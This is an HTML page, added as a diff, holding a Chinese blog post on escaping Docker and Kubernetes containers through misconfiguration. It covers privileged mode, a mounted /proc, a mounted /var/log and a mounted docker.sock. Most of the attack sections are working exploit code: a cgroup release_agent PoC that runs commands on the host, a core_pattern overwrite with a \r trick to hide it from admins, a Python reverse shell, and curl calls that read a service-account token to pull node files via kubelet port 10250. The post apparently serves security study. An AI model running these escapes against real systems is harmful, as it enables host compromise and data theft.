@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          配置不当导致的容器逃逸 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2021/01/配置不当导致的容器逃逸/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#k8s" title="k8s">k8s</a>
+                        
+                          <a class="tag" href="/tags/#云原生" title="云原生">云原生</a>
+                        
+                    </div>
+                    <h1>配置不当导致的容器逃逸</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2021-01-17
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码安全搞不动了，这几天又开始摸鱼k8s，记录下一些由于配置不当导致的容器逃逸，以及一些利用方式和原理。</p>
+<h1 id="privileged特权模式"><a href="#privileged特权模式" class="headerlink" title="privileged特权模式"></a>privileged特权模式</h1><h2 id="privileged简介"><a href="#privileged简介" class="headerlink" title="privileged简介"></a>privileged简介</h2><p>docker中提供了一个<code>--privileged</code>参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力<br><a href="https://www.docker.com/blog/docker-can-now-run-within-docker/" target="_blank" rel="noopener">https://www.docker.com/blog/docker-can-now-run-within-docker/</a></p>
+<p>docker文档中对这个参数的解释如下<br><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></p>
+<blockquote>
+<p>当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</p>
+</blockquote>
+<h2 id="如何启动一个特权模式容器"><a href="#如何启动一个特权模式容器" class="headerlink" title="如何启动一个特权模式容器"></a>如何启动一个特权模式容器</h2><p>在docker命令行中可以通过如下命令启动一个特权容器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged nginx /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>k8s中，在pod的yaml配置中添加如下配置时，也会以特权模式启动容器<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">securityContext:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115114428.png" alt></p>
+<h2 id="如何检测当前环境是否是以特权模式启动"><a href="#如何检测当前环境是否是以特权模式启动" class="headerlink" title="如何检测当前环境是否是以特权模式启动"></a>如何检测当前环境是否是以特权模式启动</h2><p>在容器中时可以通过如下参数检测当前容器是否是以特权模式启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep CapEff</span><br></pre></td></tr></table></figure></p>
+<p>如果是以特权模式启动的话，<code>CapEff</code>对应的掩码值应该为<code>0000003fffffffff</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115114749.png" alt></p>
+<p>这里可以稍微延申一下linux的Capabilities机制<br><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man7/capabilities.7.html</a><br>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的root特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时,操作系统会检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</p>
+<p>一个线程拥有五个Capabilities集合<code>Permitted</code>、<code>Inheritable</code>、<code>Effective</code>、<code>Bounding</code>和<code>Ambient</code><br>分别对应了<code>/proc/self/status</code>中的<code>CapPrm</code>、<code>CapInh</code>、<code>CapEff</code>、<code>CapBnd</code>和<code>CapAmb</code><br><code>Effective</code>集合就是主要的当前线程特权操作权限（Capabilities）的集合。</p>
+<p>例如通过<code>sudo -s</code>切换成root用户之后就可以看到Capabilities权限的变化<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115144040.png" alt><br>通过<code>capsh</code>命令可以解码出具体的Capabilitie<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115144014.png" alt></p>
+<p>简而言之，如果当前容器中的<code>CapEff</code>为<code>0000003fffffffff</code>时则有了宿主机root用户的特权模式</p>
+<h2 id="挂载宿主机目录"><a href="#挂载宿主机目录" class="headerlink" title="挂载宿主机目录"></a>挂载宿主机目录</h2><p>在特权模式下，可以直接挂载宿主机的磁盘，chroot之后就可以像访问本地文件一样，读取宿主机上的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /abc</span><br><span class="line">mount /dev/sda1 /abc</span><br><span class="line">chroot /abc/</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115144855.png" alt><br>或者其实这里写下crontab应该也可getshell</p>
+<h2 id="执行宿主机系统命令"><a href="#执行宿主机系统命令" class="headerlink" title="执行宿主机系统命令"></a>执行宿主机系统命令</h2><p>如下文章中给出了这样一个思路，通过<code>notify_on_release</code>实现容器逃逸<br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br>先给出poc，在宿舍机上执行了<code>ps aux</code>，并将结果写入<code>/ouput</code>文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In the container</span></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$host_path</span>/cmd"</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'#!/bin/sh'</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ps aux &gt; <span class="variable">$host_path</span>/output"</span> &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line">sh -c <span class="string">"echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到创建了一个cgroup，并且通过<code>notify_on_release</code>机制执行容器中的可执行文件。<br><a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt</a><br>并且其中通过<code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab</code>获取当前容器文件路径在宿主机上的绝对路径也算一个小trick。<br>这样就可以在宿主机上执行容器中的文件，并将结果写入容器中的文件。</p>
+<p>并且这个利用方式的要求比完全特权模式要更宽松一些，只需要满足以下条件即可</p>
+<ul>
+<li>以root用户身份在容器内运行</li>
+<li>使用SYS_ADMINLinux功能运行</li>
+<li>缺少AppArmor配置文件，否则将允许mountsyscall</li>
+<li>cgroup v1虚拟文件系统必须以读写方式安装在容器内</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -it --<span class="built_in">cap</span>-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115153044.png" alt></p>
+<h1 id="挂载-proc"><a href="#挂载-proc" class="headerlink" title="挂载/proc"></a>挂载/proc</h1><p>linux中的<code>/proc</code>目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。<br>当docker启动时将<code>/proc</code>目录挂载到容器内部时可以实现逃逸。</p>
+<p>通过文档可知，<code>/proc/sys/kernel/core_pattern</code>文件是负责进程奔溃时内存数据转储的，当第一个字符是<code>|</code>管道符时，后面的的部分会以命令行的方式进行解析并运行。<br><a href="https://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man5/core.5.html</a><br>并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。</p>
+<p>由于管道符的原因，错误的数据可能会扰乱我们的命令，因此这里用python接受并且忽略错误数据。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">"172.17.0.1"</span></span><br><span class="line">lport = <span class="number">10000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">   os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">   os.putenv(<span class="string">"HISTFILE"</span>, <span class="string">'/dev/null'</span>)</span><br><span class="line">   pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">   <span class="comment"># os.remove('/tmp/.x.py')</span></span><br><span class="line">   s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure></p>
+<p>并且创建一个会抛出段错误的程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> *a  = <span class="literal">NULL</span>;</span><br><span class="line">   *a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后在<code>core_pattern</code>文件中写入运行反弹shell的命令（这里需要注意由于是以宿主机上的权限运行的，因此python的路径则也是docker目录的路径）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host_path=`sed -n <span class="string">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"|<span class="variable">$host_path</span>/tmp/.x.py \rcore    "</span> &gt;  /host-proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure></p>
+<p><code>\r</code>之后的内容主要是为了为了管理员通过<code>cat</code>命令查看内容时隐蔽我们写入恶意命令。<br>这样当我们运行c文件之后，就会抛出段错误，然后执行<code>core_pattern</code>中的命令（运行成功<code>core_pattern</code>时会有<code>core dumped</code>的输出）<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115163552.png" alt><br>此时就能监听到返回的shell<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115163648.png" alt></p>
+<h1 id="挂载-var-log"><a href="#挂载-var-log" class="headerlink" title="挂载/var/log"></a>挂载/var/log</h1><p><a href="https://github.com/danielsagi/kube-pod-escape" target="_blank" rel="noopener">https://github.com/danielsagi/kube-pod-escape</a><br>这里用单纯的挂载<code>/var/log</code>来形容这个逃逸的触发条件其实不太严谨，需要满足如下条件。</p>
+<ul>
+<li>挂载了<code>/var/log</code></li>
+<li>容器是在一个k8s的环境中</li>
+<li>当前pod的serviceaccount拥有get|list|watch log的权限</li>
+</ul>
+<p>个人感觉这个条件其实还是蛮合理的，并不牵强，类似于赋予了当前pod一个读取日志的能力。<br>当满足以上条件时，可以与node节点的10250端口进行通信，并通过软链接的方式读取node上的文件。</p>
+<p>通过github中给出的yaml文件可以快速启动这样一个场景。可以来分析以下这个yaml配置到底做了些什么操作。<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">logger</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">user-log-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes/log</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get",</span> <span class="string">"list"</span><span class="string">,</span> <span class="string">"watch"</span><span class="string">]</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">user-log-reader</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">user-log-reader</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">logger</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">escaper</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">logger</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">escaper</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">danielsagi/kube-pod-escape</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/log/host</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">logs</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/var/log/</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到前三个配置主要是设置了一个<code>nodes/log</code>的<code>get|list|watch</code>权限，并且将这个权限赋予给logger对象。再以logger对象启动了一个pod。</p>
+<p>这时候在pod中通过serviceaccount的token就可以访问node上10250端口并获取log<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">curl -k https://172.17.0.1:10250/logs/ -H <span class="string">"Authorization: Bearer <span class="variable">$token</span>"</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115165335.png" alt><br>当然，访问一些<code>/pods</code>之类的目录时由于没有权限，访问会被禁止<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115170447.png" alt></p>
+<p>继续回到logs，这个目录其实就是当前容器上被挂载的<code>/var/log/host</code>目录<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115165451.png" alt><br>同时也是node节点上的<code>/var/log/</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115165649.png" alt></p>
+<p>这样当我们通过软链接的方式在当前log目录下创建一个指向根目录的链接时<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s / ./root_link</span><br></pre></td></tr></table></figure></p>
+<p>在容器和node中这个<code>root_link</code>文件指向的都是自己本机的根目录<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115170138.png" alt><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115170200.png" alt></p>
+<p>因此通过node的10250访问<code>logs/root_link</code>时，访问到的是node节点上的根目录，从而就可以读取到node机子上的文件<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115170343.png" alt></p>
+<p>github中的脚本则通过这种方式遍历了node节点上的敏感文件，并下载到本地<br><a href="https://github.com/danielsagi/kube-pod-escape/blob/master/find_sensitive_files.py" target="_blank" rel="noopener">https://github.com/danielsagi/kube-pod-escape/blob/master/find_sensitive_files.py</a></p>
+<h1 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a>挂载docker.sock</h1><p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115175233.png" alt><br>docker cli默认通过unix套接字与容器进行通信以及下发指令，当挂载了<code>/var/run/docker.sock</code>文件时，就可以对这个unix套接字文件下发docker指令，就像在node机器上操纵docker一样。</p>
+<p>这里通过如下命令挂载<code>/var/run</code>目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --rm -it -v /var/run/:/host-var-run/ centos /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>为了方便这里我们将自己机子上的docker cli cp进容器。（尝试过在容器中直接yum但是下载下来的cli似乎不能用，建议实战中直接传一个cli）</p>
+<p>然后通过<code>-H</code>命令指定unix套接字文件的地址即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./docker -H unix:///host-var-run/docker.sock ps</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20210115175730.png" alt><br>这样能操纵宿主机上的docker</p>
+<p>这样容器逃逸也就变得简单了，直接新起一个docker，将宿主机的根目录挂载进去，并且以特权模式启动。<br>之后的过程就很简单了，这里就不赘述了。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&amp;mid=2247487393&amp;idx=1&amp;sn=6cec3da009d25cb1c766bb9dae809a86&amp;chksm=e84fa97edf382068250b4811419aa17811c7f244ab87dcbcbe63be328f98ecaf0ab9feeedf8c&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&amp;mid=2247487393&amp;idx=1&amp;sn=6cec3da009d25cb1c766bb9dae809a86&amp;chksm=e84fa97edf382068250b4811419aa17811c7f244ab87dcbcbe63be328f98ecaf0ab9feeedf8c&amp;scene=21#wechat_redirect</a><br><a href="https://mp.weixin.qq.com/s?subscene=19&amp;__biz=MzIyODYzNTU2OA==&amp;mid=2247487590&amp;idx=1&amp;sn=060a8bdf2ddfaff6ceae5cb931cb27ab&amp;chksm=e84fb6b9df383faf1723040a0d6f0300c9517db902ef0010e230d8e802b1dfe9d8b95e6aabbd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?subscene=19&amp;__biz=MzIyODYzNTU2OA==&amp;mid=2247487590&amp;idx=1&amp;sn=060a8bdf2ddfaff6ceae5cb931cb27ab&amp;chksm=e84fb6b9df383faf1723040a0d6f0300c9517db902ef0010e230d8e802b1dfe9d8b95e6aabbd</a><br><a href="https://xz.aliyun.com/t/7881" target="_blank" rel="noopener">https://xz.aliyun.com/t/7881</a><br><a href="https://xz.aliyun.com/t/8558" target="_blank" rel="noopener">https://xz.aliyun.com/t/8558</a><br><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a><br><a href="https://www.docker.com/blog/docker-can-now-run-within-docker/" target="_blank" rel="noopener">https://www.docker.com/blog/docker-can-now-run-within-docker/</a><br><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man7/capabilities.7.html</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt</a><br><a href="https://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man5/core.5.html</a><br><a href="https://github.com/danielsagi/kube-pod-escape" target="_blank" rel="noopener">https://github.com/danielsagi/kube-pod-escape</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2021/04/docker容器核心技术与实现简介/" data-toggle="tooltip" data-placement="top" title="docker容器核心技术与实现简介">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2021/01/静态程序分析笔记/" data-toggle="tooltip" data-placement="top" title="静态程序分析笔记">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#k8s" title="k8s">k8s</a>
+                        
+                          <a class="tag" href="/tags/#云原生" title="云原生">云原生</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
